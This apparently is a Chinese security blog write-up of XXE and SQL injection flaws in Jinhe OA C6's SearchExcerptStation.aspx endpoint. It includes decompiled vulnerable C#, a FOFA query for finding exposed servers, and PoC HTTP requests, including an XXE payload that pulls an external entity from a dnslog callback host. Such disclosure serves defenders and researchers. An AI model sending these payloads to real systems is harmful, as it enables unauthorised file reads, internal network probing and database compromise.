---
title: "金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-SearchExcerptStation-xxe-sqli.html
asset_dir: assets/金和oa-searchexcerptstation.aspx-xxe+sql注入漏洞
---

# 金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/30 13:31
- 521浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

云安全解决方案

网络安全课程

企业安全咨询

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `SearchExcerptStation.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `SearchExcerptStation.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **SearchExcerptStation** 的处理逻辑

```
public class SearchExcerptStation : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    this.Request.QueryString.ToString();
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
    string innerText = xmlDocument.DocumentElement.ChildNodes.Item(0).InnerText;
    JHSoft.Appraise.AppraiseSet appraiseSet = new JHSoft.Appraise.AppraiseSet();
    string sql = string.Format("select distinct ApprSetID,StaName from appraiseSet a inner join Station b on (a.AppraiseStation=b.StaID) \r\nWhere a.DelFlag = 0 and AppraiseType='{0}' union\r\nselect distinct ApprSetID,StaName=Reg_Name from appraiseSet a inner join jhbj_register b on (a.regcode=b.reg_code) \r\nWhere a.DelFlag = 0 and AppraiseType='{0}'  order by StaName Asc", (object) innerText);
    DataTable dataTable = appraiseSet.BindList(sql);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时第一个节点的值被直接带入sql语句中执行，从而也造成了[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Appraise/SearchExcerptStation.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

计算机安全

恶意软件分析工具

安全工具开发

在DNSLOG平台成功收到HTTP请求

代码安全审计

[![金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.Appraise/SearchExcerptStation.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
<node>SQLI_POC</node>
</root>
```

[![金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞](images/img-002-e3461919b24f.webp)](https://image.mrxn.net/a7028574bfd34fc5b3fbbe171d2c5eb5.webp)

成延时 10 秒（执行两次）

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

编程
